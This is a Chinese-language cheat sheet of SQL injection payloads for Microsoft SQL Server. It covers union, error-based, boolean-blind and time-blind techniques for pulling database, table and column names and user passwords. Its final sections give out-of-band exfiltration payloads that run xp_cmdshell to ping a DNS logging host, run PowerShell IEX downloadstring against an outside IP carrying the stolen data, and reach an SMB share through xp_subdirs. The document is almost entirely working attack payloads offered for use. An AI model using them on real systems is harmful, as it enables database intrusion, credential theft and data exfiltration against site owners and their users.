### 联合查询

```
1. 获取当前数据库名
	0' union select top 1 1,2,db_name() --+
2. 获取所有数据库名
	0' union select top 1 1,2,name from master.sys.databases where name not in (select top 1 name from master.sys.databases) --+
3. 获取当前表名
	0' union select top 1 1,2,table_name from information_schema.tables --+
4. 获取所有表名
	0' union select top 1 1,2,table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables) --+
5. 获取当前字段名
	0' union select top 1 1,2,column_name from information_schema.columns --+
6. 获取所有字段名
	0' union select top 1 1,2,column_name from information_schema.columns where column_name not in (select top 1 column_name from information_schema.columns)  --+
7. 获取当前数据
	0' union select top 1 * from users --+
8. 获取所有数据
	id=0' union select top 1 1,username,password from users where username not in(select top m username from users) and password not in(select top m password from users) --+
```

### 报错注入

```
1. 获取当前数据库名
	1' and 1=db_name() --+
2. 获取所有数据库名
	1' and (select name from master.sys.dbo.databases where database_id=1)>0 --+
3. 获取当前表名
	1' and (select top 1 table_name from information_schema.tables)>0 --+
4. 获取所有表名
	1' and (select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))>0 --+
5. 获取当前字段名
	1' and (select top 1 column_name from information_schema.columns)>0 --+
6. 获取所有字段名
	1' and (select top 1 column_name from information_schema.columns where column_name not in (select top 1 column_name from information_schema.columns))>0 --+
7. 获取当前数据
	1' and (select top 1 username password from users)>0 --+
8. 获取其他数据
	1' and (select username password from users where id=2)>0 --+
```

### 布尔盲注

```
1. 判断数据库名长度
	1' and len(db_name()) >10 --+
2. 暴力破解数据库名
	1' and ascii(substring((select db_name),n,1))=m --+
3. 判断表名长度
	1' and len((select top 1 table_name from information_schema.tables))>10 --+
4. 暴力破解表名
	1' and ascii(substring((select top 1 table_name from information_schema.tables),n,1))=m --+
5. 判断字段名长度
	1' and len((select top 1 column_name from information_schema.columns))>10 --+
6. 暴力破解字段名
	1' and ascii(substring((select top 1 column_name from information_schema.columns),n,1))=m --+
7. 判断第一行数据的第一个字段内容长度
	1' and len((select top 1 id from emails))>10 --+
8. 暴力破解具体内容
```

### 时间盲注

```
if(ascii(substring((select top 1 table_name from information_schema.tables),1,1))=116) waitfor delay '0:0:5' --
```



```
1. 判断数据库名长度
	1' if(len(db_name()) >2) waitfor delay '0:0:5' --+
2. 暴力破解数据库名
	1' if(ascii(substring((select db_name()),n,1))=m) waitfor delay '0:0:5' --+
3. 判断表名长度
	1' if(len((select top 1 table_name from information_schema.tables))>10) waitfor delay '0:0:5' --+
4. 暴力破解表名
	1' if(ascii(substring((select top 1 table_name from information_schema.tables),n,1))=m) waitfor delay '0:0:5' --+
5. 判断字段名长度
	1' if(len((select top 1 column_name from information_schema.columns))>10) waitfor delay '0:0:5' --+
6. 暴力破解字段名
	1' if(ascii(substring((select top 1 column_name from information_schema.columns),n,1))=m) waitfor delay '0:0:5' --+
7. 判断第一行数据的第一个字段内容长度
	1' if(len((select top 1 id from emails))>10) waitfor delay '0:0:5' --+
8. 暴力破解具体内容
```



### dns数据外带

```
1. 获取数据库名
	id=1';declare @a varchar(8000);set @a=db_name();exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
2. 获取当前表名
	id=1';declare @a varchar(8000);set @a=(select top 1 table_name from information_schema.tables) ;exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
3. 获取所有表名	
	id=1';declare @a varchar(8000);set @a=(select top 1 table_name from information_schema.tables where table_name not in (select top 2 table_name from information_schema.tables)) ;exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
4. 获取当前字段名
	id=1';declare @a varchar(8000);set @a=(select top 1 column_name from information_schema.columns) ;exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
5. 获取所有字段名
	id=1';declare @a varchar(8000);set @a=(select top 1 column_name from information_schema.columns where column_name not in (select top 2 column_name from information_schema.columns)) ;exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
6. 获取所有字段内数据
	id=1';declare @a varchar(8000);set @a=(select top uagent from emails) ;exec('master..xp_cmdshell "ping.exe '%2b%@a%2b'.Laffrex.eyes.sh -n 1"') --+
```

### http数据外带

```
1. 获取数据库名
	id=1';declare @a varchar(8000);set @a=db_name();exec('master..xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring(''http://192.168.72.12:8000?data='%2b@a%2b''')"') --+
2. 获取表名
	id=1';declare @a varchar(8000);set @a=(select top 1 table_name from information_schema.tables);exec('master..xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring(''http://192.168.72.12:8000?data='%2b@a%2b''')"') --+
3. 获取字段名
	id=1';declare @a varchar(8000);set @a=(select top 1 column_name from information_schema.columns);exec('master..xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring(''http://192.168.72.12:8000?data='%2b@a%2b''')"') --+
```

### smb数据外带

```
1. 获取数据库名
	id=1';declare @a varchar(1024);set @a=db_name();exec('master..xp_subdirs "//'%2b'192.168.172.100\\'%2b@a%2b'.txt"') --+
2. 获取表名
	id=1';declare @a varchar(1024);set @a=(select top 1 table_name from information_schema.tables);exec('master..xp_subdirs "//'%2b'192.168.172.100\\'%2b@a%2b'.txt"') --+
3. 获取字段名
	id=1';declare @a varchar(1024);set @a=(select top 1 column_name from information_schema.columns);exec('master..xp_fileexist "//'%2b'192.168.71.11\\'%2b@a%2b'.txt "') --+

tail -f /var/log/samba/log.smbd | grep "failed"
```

